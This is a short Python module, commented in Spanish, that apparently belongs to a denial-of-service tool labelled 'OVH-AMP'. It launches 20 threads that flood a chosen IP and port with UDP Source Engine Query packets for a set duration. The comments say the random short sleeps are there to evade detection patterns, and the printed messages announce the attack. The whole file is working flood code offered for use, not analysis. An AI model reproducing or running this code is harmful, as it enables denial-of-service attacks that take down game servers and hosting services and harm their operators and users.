import time
import socket
import threading
import random
import os

# Payload AMP típico para Source Engine Query (usado en juegos de Steam)
AMP_PAYLOAD = b'\xFF\xFF\xFF\xFFTSource Engine Query\x00'

def amp_packet():
    # Retorna el payload AMP legítimo
    return AMP_PAYLOAD

def attack_thread(ip, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        pkt = amp_packet()
        try:
            sock.sendto(pkt, (ip, port))
        except Exception:
            pass
        # Sleep corto y variable para evadir patrones
        time.sleep(random.uniform(0.01, 0.05))

def run(ip, port, duration, stop_event, threads=20):
    end_time = time.time() + duration
    print(f"[OVH-AMP] Lanzando ataque AMP a {ip}:{port} usando {threads} threads")
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack_thread, args=(ip, port, stop_event))
        t.start()
        thread_list.append(t)
    try:
        while not stop_event.is_set() and time.time() < end_time:
            time.sleep(1)
    finally:
        stop_event.set()
        for t in thread_list:
            t.join()
    print("[OVH-AMP] Ataque finalizado")
